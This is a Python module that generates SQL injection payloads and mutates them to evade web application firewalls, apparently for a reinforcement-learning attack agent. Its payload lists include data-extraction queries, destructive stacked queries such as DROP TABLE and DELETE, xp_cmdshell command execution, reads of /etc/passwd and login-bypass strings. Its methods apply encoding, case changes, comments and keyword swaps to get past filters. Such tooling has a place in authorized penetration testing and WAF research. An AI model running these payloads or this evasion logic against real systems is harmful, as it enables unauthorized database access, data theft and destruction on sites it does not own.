"""
Payload generator for SQL injection testing
"""

import random
import json
from typing import Dict, List, Any, Optional
from ..agent.action_space import ActionSpace, ActionType
from ..waf.bypass_methods import BypassMethods


class PayloadGenerator:
    """
    Generates and modifies SQL injection payloads based on agent actions.
    """
    
    def __init__(self):
        """
        Initialize the payload generator.
        """
        self.action_space = ActionSpace()
        self.bypass_methods = BypassMethods()
        self.base_payloads = self._load_base_payloads()
        self.payload_templates = self._load_payload_templates()
        self.current_payload = ""
        self.payload_history = []
    
    def _load_base_payloads(self) -> Dict[str, List[str]]:
        """
        Load base payloads categorized by injection type.
        
        Returns:
            Dictionary of categorized payloads
        """
        return {
            'union_based': [
                "' UNION SELECT 1,2,3--",
                "' UNION ALL SELECT NULL,NULL,NULL--",
                "' UNION SELECT @@version,2,3--",
                "' UNION SELECT user(),database(),version()--",
                "' UNION SELECT table_name,NULL,NULL FROM information_schema.tables--",
                "' UNION SELECT column_name,NULL,NULL FROM information_schema.columns--",
                "1' UNION SELECT 1,2,3#",
                "1 UNION SELECT 1,2,3",
                "') UNION SELECT 1,2,3--",
                "\") UNION SELECT 1,2,3--"
            ],
            'boolean_blind': [
                "' AND 1=1--",
                "' AND 1=2--",
                "' AND 'a'='a'--",
                "' AND 'a'='b'--",
                "' AND (SELECT COUNT(*) FROM users)>0--",
                "' AND (SELECT LENGTH(database()))>0--",
                "' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--",
                "' AND (SELECT SUBSTRING(user(),1,1))='r'--",
                "1 AND 1=1",
                "1 AND 1=2"
            ],
            'time_based': [
                "'; WAITFOR DELAY '00:00:05'--",
                "' AND SLEEP(5)--",
                "' AND BENCHMARK(5000000,MD5(1))--",
                "'; SELECT SLEEP(5)--",
                "' OR SLEEP(5)--",
                "1'; WAITFOR DELAY '00:00:05'--",
                "1' AND SLEEP(5)#",
                "1 AND SLEEP(5)",
                "'; pg_sleep(5)--",
                "' AND pg_sleep(5)--"
            ],
            'error_based': [
                "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
                "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version), 0x7e), 1)--",
                "' AND EXP(~(SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a))--",
                "' AND (SELECT COUNT(*) FROM (SELECT 1 UNION SELECT NULL UNION SELECT !1)x GROUP BY CONCAT((SELECT @@version),FLOOR(RAND(0)*2)))--",
                "' AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(95),CHAR(98),CHAR(99),CHAR(49),CHAR(57),CHAR(54),CHAR(95),@@version,CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(95))x FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)b GROUP BY x)--",
                "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version),0x7e),1)--",
                "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(0x7e,(SELECT @@version),0x7e)) USING utf8)))--",
                "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()), 0x7e))#",
                "1 AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT user()), 0x7e))",
                "'; SELECT 1/0--"
            ],
            'stacked_queries': [
                "'; INSERT INTO users VALUES ('hacker','password')--",
                "'; UPDATE users SET password='hacked' WHERE id=1--",
                "'; DELETE FROM users WHERE id=1--",
                "'; DROP TABLE users--",
                "'; CREATE TABLE temp (id INT)--",
                "'; EXEC xp_cmdshell('dir')--",
                "'; SELECT LOAD_FILE('/etc/passwd')--",
                "'; SELECT INTO OUTFILE '/tmp/result.txt'--",
                "1'; INSERT INTO admin VALUES ('admin','admin')#",
                "1; EXEC sp_configure 'show advanced options', 1"
            ],
            'bypass_authentication': [
                "admin'--",
                "admin'#",
                "admin'/*",
                "' OR 1=1--",
                "' OR 'a'='a",
                "') OR ('a'='a",
                "') OR 1=1--",
                "admin') OR ('1'='1'--",
                "1' OR '1'='1'#",
                "' OR 1=1#"
            ]
        }
    
    def _load_payload_templates(self) -> Dict[str, str]:
        """
        Load payload templates for dynamic generation.
        
        Returns:
            Dictionary of payload templates
        """
        return {
            'union_template': "' UNION SELECT {columns}--",
            'boolean_template': "' AND {condition}--",
            'time_template': "' AND {delay_function}--",
            'error_template': "' AND {error_function}--",
            'stacked_template': "'; {sql_statement}--",
            'comment_template': "{payload}{comment}",
            'encoded_template': "{encoded_payload}"
        }
    
    def generate_payload(self, action: int, current_state: Dict[str, Any]) -> str:
        """
        Generate a payload based on the given action and current state.
        
        Args:
            action: Action index from action space
            current_state: Current environment state
            
        Returns:
            Generated payload string
        """
        action_info = self.action_space.get_action_by_index(action)
        
        if not action_info:
            return self._get_random_payload()
        
        action_type = action_info['type']
        action_name = action_info['name']
        
        # Generate base payload if starting fresh or terminating
        if action_type == ActionType.TERMINATE or not self.current_payload:
            self.current_payload = self._get_base_payload(current_state)
        
        # Apply action-specific modifications
        if action_type == ActionType.MODIFY_PAYLOAD:
            return self._modify_payload(action_name, current_state)
        elif action_type == ActionType.ENCODE_PAYLOAD:
            return self._encode_payload(action_name, current_state)
        elif action_type == ActionType.OBFUSCATE_PAYLOAD:
            return self._obfuscate_payload(action_name, current_state)
        elif action_type == ActionType.CASE_VARIATION:
            return self._apply_case_variation(action_name, current_state)
        elif action_type == ActionType.COMMENT_INSERTION:
            return self._insert_comments(action_name, current_state)
        elif action_type == ActionType.WHITESPACE_MANIPULATION:
            return self._manipulate_whitespace(action_name, current_state)
        elif action_type == ActionType.KEYWORD_REPLACEMENT:
            return self._replace_keywords(action_name, current_state)
        elif action_type in [ActionType.UNION_INJECTION, ActionType.BLIND_INJECTION, 
                           ActionType.ERROR_BASED, ActionType.TIME_BASED]:
            return self._generate_technique_payload(action_type, current_state)
        elif action_type in [ActionType.DOUBLE_ENCODING, ActionType.HTTP_PARAMETER_POLLUTION, 
                           ActionType.CHUNKED_ENCODING]:
            return self._apply_advanced_technique(action_name, current_state)
        else:
            return self.current_payload
    
    def apply_action(self, action: int, payload: str) -> str:
        """
        Apply a specific action to modify an existing payload.
        
        Args:
            action: Action index
            payload: Existing payload
            
        Returns:
            Modified payload
        """
        self.current_payload = payload
        action_info = self.action_space.get_action_by_index(action)
        
        if not action_info:
            return payload
        
        action_name = action_info['name']
        
        # Map action names to bypass methods
        if action_name in ['url_encode', 'hex_encode', 'unicode_encode']:
            method_name = action_name
            return self.bypass_methods.apply_bypass_method(payload, method_name)
        elif action_name == 'double_url_encode':
            return self.bypass_methods.apply_bypass_method(payload, 'double_url')
        elif action_name == 'randomize_case':
            return self.bypass_methods.apply_bypass_method(payload, 'case_variation', method='random')
        elif action_name == 'alternate_case':
            return self.bypass_methods.apply_bypass_method(payload, 'case_variation', method='alternate')
        elif action_name in ['append_comment', 'prepend_comment', 'insert_comment']:
            return self.bypass_methods.apply_bypass_method(payload, 'comment_insertion')
        elif action_name == 'add_whitespace':
            return self.bypass_methods.apply_bypass_method(payload, 'whitespace_manipulation')
        elif action_name == 'replace_spaces':
            return self.bypass_methods.apply_bypass_method(payload, 'whitespace_manipulation', method='tabs')
        elif action_name in ['keyword_concat', 'keyword_equivalent']:
            return self.bypass_methods.apply_bypass_method(payload, 'keyword_replacement')
        elif action_name == 'function_obfuscation':
            return self.bypass_methods.apply_bypass_method(payload, 'function_obfuscation')
        elif action_name == 'arithmetic_obfuscation':
            return self.bypass_methods.apply_bypass_method(payload, 'arithmetic_obfuscation')
        else:
            return payload
    
    def _get_base_payload(self, current_state: Dict[str, Any]) -> str:
        """
        Get a base payload appropriate for the current state.
        
        Args:
            current_state: Current environment state
            
        Returns:
            Base payload string
        """
        # Choose payload type based on state
        waf_detected = current_state.get('waf_detected', False)
        attempt_count = current_state.get('attempt_count', 0)
        
        if attempt_count == 0:
            # Start with simple boolean injection
            return random.choice(self.base_payloads['boolean_blind'])
        elif attempt_count < 5:
            # Try union-based injections
            return random.choice(self.base_payloads['union_based'])
        elif attempt_count < 10:
            # Try error-based injections
            return random.choice(self.base_payloads['error_based'])
        elif attempt_count < 15:
            # Try time-based injections
            return random.choice(self.base_payloads['time_based'])
        else:
            # Random payload
            return self._get_random_payload()
    
    def _get_random_payload(self) -> str:
        """
        Get a random payload from all available payloads.
        
        Returns:
            Random payload string
        """
        all_payloads = []
        for category_payloads in self.base_payloads.values():
            all_payloads.extend(category_payloads)
        return random.choice(all_payloads)
    
    def _modify_payload(self, action_name: str, current_state: Dict[str, Any]) -> str:
        """
        Modify the current payload based on the action.
        
        Args:
            action_name: Name of the modification action
            current_state: Current environment state
            
        Returns:
            Modified payload
        """
        if action_name == 'append_comment':
            comments = ['--', '#', '/**/']
            comment = random.choice(comments)
            return self.current_payload + comment
        elif action_name == 'prepend_comment':
            comments = ['/**/', '-- ']
            comment = random.choice(comments)
            return comment + self.current_payload
        elif action_name == 'buffer_overflow':
            padding = 'A' * random.randint(100, 1000)
            return self.current_payload + padding
        else:
            return self.current_payload
    
    def _encode_payload(self, action_name: str, current_state: Dict[str, Any]) -> str:
        """
        Apply encoding to the current payload.
        
        Args:
            action_name: Name of the encoding action
            current_state: Current environment state
            
        Returns:
            Encoded payload
        """
        if action_name == 'url_encode':
            return self.bypass_methods.apply_bypass_method(self.current_payload, 'url')
        elif action_name == 'hex_encode':
            return self.bypass_methods.apply_bypass_method(self.current_payload, 'hex')
        elif action_name == 'unicode_encode':
            return self.bypass_methods.apply_bypass_method(self.current_payload, 'unicode')
        else:
            return self.current_payload
    
    def _obfuscate_payload(self, action_name: str, current_state: Dict[str, Any]) -> str:
        """
        Apply obfuscation to the current payload.
        
        Args:
            action_name: Name of the obfuscation action
            current_state: Current environment state
            
        Returns:
            Obfuscated payload
        """
        if action_name == 'function_obfuscation':
            return self.bypass_methods.apply_bypass_method(self.current_payload, 'function_obfuscation')
        elif action_name == 'arithmetic_obfuscation':
            return self.bypass_methods.apply_bypass_method(self.current_payload, 'arithmetic_obfuscation')
        else:
            return self.current_payload
    
    def _apply_case_variation(self, action_name: str, current_state: Dict[str, Any]) -> str:
        """
        Apply case variation to the current payload.
        
        Args:
            action_name: Name of the case variation action
            current_state: Current environment state
            
        Returns:
            Case-modified payload
        """
        if action_name == 'randomize_case':
            return self.bypass_methods.apply_bypass_method(
                self.current_payload, 'case_variation', method='random'
            )
        elif action_name == 'alternate_case':
            return self.bypass_methods.apply_bypass_method(
                self.current_payload, 'case_variation', method='alternate'
            )
        else:
            return self.current_payload
    
    def _insert_comments(self, action_name: str, current_state: Dict[str, Any]) -> str:
        """
        Insert comments into the current payload.
        
        Args:
            action_name: Name of the comment insertion action
            current_state: Current environment state
            
        Returns:
            Comment-modified payload
        """
        comment_types = ['/**/', '--', '#']
        comment = random.choice(comment_types)
        return self.bypass_methods.apply_bypass_method(
            self.current_payload, 'comment_insertion', comment_type=comment
        )
    
    def _manipulate_whitespace(self, action_name: str, current_state: Dict[str, Any]) -> str:
        """
        Manipulate whitespace in the current payload.
        
        Args:
            action_name: Name of the whitespace manipulation action
            current_state: Current environment state
            
        Returns:
            Whitespace-modified payload
        """
        if action_name == 'add_whitespace':
            return self.bypass_methods.apply_bypass_method(
                self.current_payload, 'whitespace_manipulation', method='mixed'
            )
        elif action_name == 'replace_spaces':
            return self.bypass_methods.apply_bypass_method(
                self.current_payload, 'whitespace_manipulation', method='tabs'
            )
        else:
            return self.current_payload
    
    def _replace_keywords(self, action_name: str, current_state: Dict[str, Any]) -> str:
        """
        Replace keywords in the current payload.
        
        Args:
            action_name: Name of the keyword replacement action
            current_state: Current environment state
            
        Returns:
            Keyword-replaced payload
        """
        return self.bypass_methods.apply_bypass_method(self.current_payload, 'keyword_replacement')
    
    def _generate_technique_payload(self, technique_type: ActionType, 
                                  current_state: Dict[str, Any]) -> str:
        """
        Generate a payload for a specific injection technique.
        
        Args:
            technique_type: Type of injection technique
            current_state: Current environment state
            
        Returns:
            Technique-specific payload
        """
        if technique_type == ActionType.UNION_INJECTION:
            # Generate UNION payload with dynamic column count
            column_count = current_state.get('estimated_columns', 3)
            columns = ','.join([str(i) for i in range(1, column_count + 1)])
            return f"' UNION SELECT {columns}--"
        
        elif technique_type == ActionType.BLIND_INJECTION:
            conditions = [
                "(SELECT COUNT(*) FROM information_schema.tables)>0",
                "(SELECT LENGTH(database()))>0",
                "ASCII(SUBSTRING((SELECT database()),1,1))>64",
                "(SELECT COUNT(*) FROM users)>0"
            ]
            condition = random.choice(conditions)
            return f"' AND {condition}--"
        
        elif technique_type == ActionType.ERROR_BASED:
            error_functions = [
                "EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))",
                "UPDATEXML(1, CONCAT(0x7e, (SELECT database()), 0x7e), 1)",
                "EXP(~(SELECT * FROM (SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a))"
            ]
            function = random.choice(error_functions)
            return f"' AND {function}--"
        
        elif technique_type == ActionType.TIME_BASED:
            delay_functions = [
                "SLEEP(5)",
                "BENCHMARK(5000000,MD5(1))",
                "WAITFOR DELAY '00:00:05'"
            ]
            function = random.choice(delay_functions)
            return f"' AND {function}--"
        
        else:
            return self.current_payload
    
    def _apply_advanced_technique(self, action_name: str, current_state: Dict[str, Any]) -> str:
        """
        Apply advanced bypass techniques.
        
        Args:
            action_name: Name of the advanced technique
            current_state: Current environment state
            
        Returns:
            Modified payload
        """
        if action_name == 'double_url_encode':
            return self.bypass_methods.apply_bypass_method(self.current_payload, 'double_url')
        elif action_name == 'http_param_pollution':
            # This would be handled at the request level
            return self.current_payload
        elif action_name == 'chunked_transfer':
            # This would be handled at the HTTP level
            return self.current_payload
        else:
            return self.current_payload
    
    def generate_payload_variants(self, base_payload: str, count: int = 5) -> List[str]:
        """
        Generate multiple variants of a base payload.
        
        Args:
            base_payload: Base payload to create variants from
            count: Number of variants to generate
            
        Returns:
            List of payload variants
        """
        return self.bypass_methods.generate_bypass_variants(base_payload, count)
    
    def get_payload_info(self, payload: str) -> Dict[str, Any]:
        """
        Analyze a payload and return information about it.
        
        Args:
            payload: Payload to analyze
            
        Returns:
            Dictionary with payload information
        """
        info = {
            'length': len(payload),
            'type': self._classify_payload(payload),
            'keywords': self._extract_keywords(payload),
            'special_chars': self._count_special_chars(payload),
            'encoding_detected': self._detect_encoding(payload),
            'complexity_score': self._calculate_complexity(payload)
        }
        
        return info
    
    def _classify_payload(self, payload: str) -> str:
        """
        Classify the type of SQL injection payload.
        
        Args:
            payload: Payload to classify
            
        Returns:
            Payload type string
        """
        payload_lower = payload.lower()
        
        if 'union' in payload_lower:
            return 'union_based'
        elif any(keyword in payload_lower for keyword in ['sleep', 'waitfor', 'benchmark']):
            return 'time_based'
        elif any(keyword in payload_lower for keyword in ['extractvalue', 'updatexml', 'exp']):
            return 'error_based'
        elif any(keyword in payload_lower for keyword in ['and', 'or']) and '=' in payload:
            return 'boolean_blind'
        elif any(keyword in payload_lower for keyword in ['insert', 'update', 'delete', 'drop']):
            return 'stacked_queries'
        else:
            return 'generic'
    
    def _extract_keywords(self, payload: str) -> List[str]:
        """
        Extract SQL keywords from a payload.
        
        Args:
            payload: Payload to analyze
            
        Returns:
            List of detected keywords
        """
        keywords = [
            'select', 'union', 'insert', 'update', 'delete', 'drop', 'create',
            'alter', 'where', 'from', 'and', 'or', 'order', 'group', 'having',
            'sleep', 'waitfor', 'benchmark', 'extractvalue', 'updatexml'
        ]
        
        detected = []
        payload_lower = payload.lower()
        
        for keyword in keywords:
            if keyword in payload_lower:
                detected.append(keyword)
        
        return detected
    
    def _count_special_chars(self, payload: str) -> Dict[str, int]:
        """
        Count special characters in a payload.
        
        Args:
            payload: Payload to analyze
            
        Returns:
            Dictionary with character counts
        """
        special_chars = ["'", '"', '(', ')', ';', '--', '#', '/*', '*/', '<', '>', '=']
        counts = {}
        
        for char in special_chars:
            counts[char] = payload.count(char)
        
        return counts
    
    def _detect_encoding(self, payload: str) -> List[str]:
        """
        Detect encoding methods used in a payload.
        
        Args:
            payload: Payload to analyze
            
        Returns:
            List of detected encoding methods
        """
        encodings = []
        
        if '%' in payload:
            encodings.append('url_encoded')
        if '0x' in payload.lower():
            encodings.append('hex_encoded')
        if '\\x' in payload:
            encodings.append('hex_escape')
        if '%u' in payload:
            encodings.append('unicode_encoded')
        if any(ord(char) > 127 for char in payload):
            encodings.append('unicode_chars')
        
        return encodings
    
    def _calculate_complexity(self, payload: str) -> float:
        """
        Calculate a complexity score for a payload.
        
        Args:
            payload: Payload to analyze
            
        Returns:
            Complexity score (0.0 to 1.0)
        """
        factors = {
            'length': min(len(payload) / 100.0, 1.0) * 0.2,
            'keywords': min(len(self._extract_keywords(payload)) / 10.0, 1.0) * 0.3,
            'special_chars': min(sum(self._count_special_chars(payload).values()) / 20.0, 1.0) * 0.2,
            'encoding': len(self._detect_encoding(payload)) / 5.0 * 0.3
        }
        
        return sum(factors.values())
